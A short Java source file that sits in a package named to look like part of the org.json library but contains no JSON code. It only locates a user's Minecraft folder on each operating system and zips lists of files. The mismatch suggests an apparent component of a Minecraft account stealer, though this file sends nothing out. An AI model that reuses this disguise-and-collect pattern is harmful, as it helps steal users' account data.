package org.json.updated.parsers.util;

import java.io.*;
import java.util.ArrayList;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class FileSystemHelper {
    public static String getSeparator() {
        String sep = System.getProperty("file.separator");
        return sep == null || sep.isEmpty() ? "/" : sep;
    }

    public static String getMinecraftFolder() {
        String os = System.getProperty("os.name").toLowerCase();
        String home = System.getProperty("user.home");
        String sep = getSeparator();

        home += sep;

        if (os.contains("win")) return home + "AppData/Roaming/.minecraft/";
        else if (os.contains("mac") || os.contains("darwin")) return home + "Library/Application Support/minecraft/";
        else if (os.contains("nix")) return home + ".config/.minecraft/";
        else return null;
    }

    public static void zip(String dir, ArrayList<File> files) {
        File outputFile = new File(dir);
        try {
            FileOutputStream outputStream = new FileOutputStream(outputFile);
            ZipOutputStream zipOutputStream = new ZipOutputStream(outputStream);

            for (File file : files)
                writeFileToZip(zipOutputStream, file);

            zipOutputStream.close();
        } catch (IOException e) {
            // @TODO remove
            e.printStackTrace();
        }
    }

    private static void writeFileToZip(ZipOutputStream stream, File file) {
        try {
            FileInputStream inputStream = new FileInputStream(file);
            BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream, 1024);

            ZipEntry entry = new ZipEntry(file.getName());
            stream.putNextEntry(entry);

            byte[] data = new byte[1024];
            int i;
            while ((i = bufferedInputStream.read(data, 0, 1024)) != -1)
                stream.write(data, 0, i);

            stream.closeEntry();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
